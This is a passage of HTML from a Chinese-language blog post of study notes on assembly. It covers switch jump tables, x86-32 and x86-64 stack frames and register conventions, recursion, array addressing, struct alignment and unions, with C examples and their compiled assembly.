data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216160707573.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216160707573" style="zoom:33%;"><p><strong>X86-64跳转表：</strong></p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216160832380.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216160832380.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216160832380" style="zoom: 25%;"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">switch_eg</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> w=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span>(X)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            w=y*z;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            w=y/z;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            w+=z;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            w-=z;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            w=<span class="number">2</span>;           </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> w;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">movl%edi, -20(%rbp) #x-&gt; -20(%rbp)</span><br><span class="line">movl%esi, -24(%rbp) #y-&gt; -24(%rbp)</span><br><span class="line">movl%edx, -28(%rbp) #z-&gt; -28(%rbp)</span><br><span class="line">movq$1, -8(%rbp)  #w-&gt; -8(%rbp)</span><br><span class="line">cmpl$6, -20(%rbp) #x:6</span><br><span class="line">jg.L2 #跳default</span><br><span class="line">cmpl$5, -20(%rbp)</span><br><span class="line">jge.L3 </span><br><span class="line">cmpl$3, -20(%rbp)</span><br><span class="line">je.L4</span><br><span class="line">cmpl$3, -20(%rbp)</span><br><span class="line">jg.L2</span><br><span class="line">cmpl$1, -20(%rbp)</span><br><span class="line">je.L5</span><br><span class="line">cmpl$2, -20(%rbp)</span><br><span class="line">je.L6</span><br><span class="line">jmp.L2</span><br><span class="line">.L5:</span><br><span class="line">movl-24(%rbp), %eax</span><br><span class="line">imull-28(%rbp), %eax</span><br><span class="line">cltq</span><br><span class="line">movq%rax, -8(%rbp)</span><br><span class="line">jmp.L7</span><br><span class="line">.L6:</span><br><span class="line">movl-24(%rbp), %eax</span><br><span class="line">cltd</span><br><span class="line">idivl-28(%rbp)</span><br><span class="line">cltq</span><br><span class="line">movq%rax, -8(%rbp)</span><br><span class="line">.L4:</span><br><span class="line">movl-28(%rbp), %eax</span><br><span class="line">cltq</span><br><span class="line">addq%rax, -8(%rbp)</span><br><span class="line">jmp.L7</span><br><span class="line">.L3:</span><br><span class="line">movl-28(%rbp), %eax</span><br><span class="line">cltq</span><br><span class="line">subq%rax, -8(%rbp)</span><br><span class="line">jmp.L7</span><br><span class="line">.L2:</span><br><span class="line">movq$2, -8(%rbp)</span><br><span class="line">.L7:</span><br><span class="line">movq-8(%rbp), %rax</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216155148760.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216155148760.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216155148760" style="zoom:33%;"><h1 id="12-x86-32的程序栈"><a href="#12-x86-32的程序栈" class="headerlink" title="12.x86-32的程序栈"></a>12.x86-32的程序栈</h1><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216162337009.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216162337009.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216162337009" style="zoom:33%;"><h3 id="1-x86-32寄存器使用惯例"><a href="#1-x86-32寄存器使用惯例" class="headerlink" title="1.x86-32寄存器使用惯例"></a>1.x86-32寄存器使用惯例</h3><p>过程yoo调用who</p><p><code>yoo：caller  who：callee</code></p><h4 id="通用寄存器分成两类："><a href="#通用寄存器分成两类：" class="headerlink" title="通用寄存器分成两类："></a>通用寄存器分成两类：</h4><p><strong>“调用者负责保存”</strong></p><p>调用者caller在调用子过程之前将这些寄存器内容存储在它的栈帧内</p><p><strong>“被调用者负责保存”</strong></p><p>被调用callee在使用这些寄存器之前将其原有的内容存储在它的栈帧内</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216163507118.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216163507118.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216163507118" style="zoom:33%;"><h3 id="2-递归调用"><a href="#2-递归调用" class="headerlink" title="2.递归调用"></a>2.递归调用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rfact</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rval;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    rval=rfact(x<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> rval*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">subq$32, %rsp</span><br><span class="line">movl%edi, -20(%rbp)</span><br><span class="line">cmpl$1, -20(%rbp)</span><br><span class="line">jg.L2</span><br><span class="line">movl$1, %eax</span><br><span class="line">jmp.L3</span><br><span class="line">.L2:</span><br><span class="line">movl-20(%rbp), %eax</span><br><span class="line">subl$1, %eax</span><br><span class="line">movl%eax, %edi</span><br><span class="line">call_Z5rfacti</span><br><span class="line">movl%eax, -4(%rbp)</span><br><span class="line">movl-4(%rbp), %eax</span><br><span class="line">imull-20(%rbp), %eax</span><br><span class="line">.L3:</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h1 id="13-x86-64的程序栈"><a href="#13-x86-64的程序栈" class="headerlink" title="13.x86-64的程序栈"></a>13.x86-64的程序栈</h1><table><thead><tr><th align="center">寄存器</th><th align="center">寄存器作用</th><th align="center">寄存器</th><th align="center">寄存器作用</th></tr></thead><tbody><tr><td align="center">%rax</td><td align="center">返回值</td><td align="center">%r8</td><td align="center">第五个参数</td></tr><tr><td align="center">%rbx</td><td align="center">被调用者保存</td><td align="center">%r9</td><td align="center">第六个参数</td></tr><tr><td align="center">%rcx</td><td align="center">第四个参数</td><td align="center">%r10</td><td align="center">被调用者保存</td></tr><tr><td align="center">%rdx</td><td align="center">第三个参数</td><td align="center">%r11</td><td align="center">Use for linking</td></tr><tr><td align="center">%rsi</td><td align="center">第二个参数</td><td align="center">%r12</td><td align="center">被调用者保存</td></tr><tr><td align="center">%rdi</td><td align="center">第一个参数</td><td align="center">%r13</td><td align="center">被调用者保存</td></tr><tr><td align="center">%rsp</td><td align="center">栈顶寄存器</td><td align="center">%r14</td><td align="center">被调用者保存</td></tr><tr><td align="center">%rbp</td><td align="center">被调用者保存</td><td align="center">%r15</td><td align="center">被调用者保存</td></tr></tbody></table><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216184739321.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216184739321.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216184739321" style="zoom: 33%;"><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216185245792.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216185245792.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216185245792" style="zoom: 33%;"><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216185728607.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216185728607.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216185728607" style="zoom:33%;"><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216185856982.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216185856982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216185856982" style="zoom: 33%;"><h1 id="14-数组的访问"><a href="#14-数组的访问" class="headerlink" title="14.数组的访问"></a>14.数组的访问</h1><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216192947812.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216192947812.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216192947812" style="zoom:33%;"><p><strong>二维数组访存</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fie_ele</span><span class="params">(<span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">3</span>],<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a[i][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">3</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">fie_ele(a,<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">movq%rdi, -8(%rbp)</span><br><span class="line">movl%esi, -12(%rbp)</span><br><span class="line">movl%edx, -16(%rbp)</span><br><span class="line"></span><br><span class="line">movl-12(%rbp), %eax #i</span><br><span class="line">movslq%eax, %rdx #符号扩展 #i</span><br><span class="line">movq%rdx, %rax #i</span><br><span class="line">addq%rax, %rax #i+i</span><br><span class="line">addq%rdx, %rax #3*i C=3 </span><br><span class="line">salq$2, %rax   #3*i*4 K=4</span><br><span class="line">movq%rax, %rdx #rdx=3*i*4</span><br><span class="line">movq-8(%rbp), %rax #a的地址</span><br><span class="line">addq%rax, %rdx #地址加上行</span><br><span class="line">movl-16(%rbp), %eax</span><br><span class="line">movl(%rdx,%rax,4), %eax#地址加上列</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p><strong>地址:</strong> A+<em>ix(CxK)</em>+<em>jxk</em></p><p>对于以上的数组C=3 K=4  </p><h1 id="15-结构的存储"><a href="#15-结构的存储" class="headerlink" title="15.结构的存储"></a>15.结构的存储</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rec</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">int</span> *p</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216202235945.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216202235945.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216202235945" style="zoom:33%;"><ul><li>连续分配的内存区域；</li><li>内部元素通过名字访问；</li><li>且元素可以是不同的数据类型</li></ul><h3 id="1-数据存储位置对齐"><a href="#1-数据存储位置对齐" class="headerlink" title="1.数据存储位置对齐"></a>1.数据存储位置对齐</h3><p><strong>对齐的一般原则：</strong></p><ul><li>已知某种数据类型的大小为K字节，那么其存储地址必须是K的整数倍,，普通数据类型(1,2,4,8)</li></ul><p><strong>对齐的原因：</strong></p><ul><li>计算机访问内存一般是以内存块为单位，块的大小是地址对齐，如4,8,16字节对齐等</li><li>如果数据访问地址跨越”块”边界会引起额外的内存访问</li></ul><p><strong>编译器的工作：</strong></p><ul><li>在结构的各个元素间插入额外空间来满足不同元素的对齐要求</li></ul><h3 id="2-x86-32下不同元素的对齐要求"><a href="#2-x86-32下不同元素的对齐要求" class="headerlink" title="2.x86-32下不同元素的对齐要求"></a>2.x86-32下不同元素的对齐要求</h3><h5 id="2-1基本数据类型："><a href="#2-1基本数据类型：" class="headerlink" title="2.1基本数据类型："></a><strong>2.1基本数据类型：</strong></h5><table><thead><tr><th>字节</th><th>举例</th><th>对齐方式</th></tr></thead><tbody><tr><td>1 byte</td><td>char</td><td>无要求</td></tr><tr><td>2 bytes</td><td>short</td><td>2字节对齐 地址最后一位为0</td></tr><tr><td>4 bytes</td><td>int float</td><td>4字节对齐 地址最后两位为0</td></tr><tr><td>8 bytes</td><td>double</td><td>8字节对齐 地址最后三位为0(Windows) 4字节对齐 地址最后两位为0(Linux)</td></tr></tbody></table><p>以上是32位机器的对齐方式，而对于64位机器8字节都是<strong>8字节对齐方式</strong></p><h5 id="2-2-结构的存储对齐要求："><a href="#2-2-结构的存储对齐要求：" class="headerlink" title="2.2*结构的存储对齐要求："></a><strong>2.2*结构的存储对齐要求：</strong></h5><ul><li>必须满足结构中各个元素的对齐要求</li><li>结构自身的对齐要求等于其各个元素中对齐要求最高的那个，设为<strong>k</strong>字节</li><li>结构的<strong>起始地址</strong>与<strong>结构长度</strong>必须是<strong>k</strong>的整数倍</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s1</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> i[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">double</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在windows系统或者x86-64系统下：K=8</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216204357774.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216204357774.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216204357774" style="zoom:33%;"><p>在x86-32的Linux系统：K=4</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216204550841.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216204550841.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216204550841" style="zoom:33%;"><h5 id="2-3结构数组的对齐方式："><a href="#2-3结构数组的对齐方式：" class="headerlink" title="2.3结构数组的对齐方式："></a>2.3结构数组的对齐方式：</h5><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216205200472.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216205200472.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216205200472" style="zoom:50%;"><h3 id="3-联合"><a href="#3-联合" class="headerlink" title="3.联合"></a>3.联合</h3><p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216205821142.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216205821142.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216205821142"></p><p>对于联合来说一次只能使用其中<strong>一个成员</strong>，上面的联合才占据8个字节</p><h1 id="16-汇编举例"><a href="#16-汇编举例" class="headerlink" title="16.汇编举例"></a>16.汇编举例</h1><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216212507446.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216212507446.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216212507446" style="zoom:50%;"><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216212937218.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216212937218.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216212937218" style="zoom:50%;"><p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216213003490.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216213003490.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 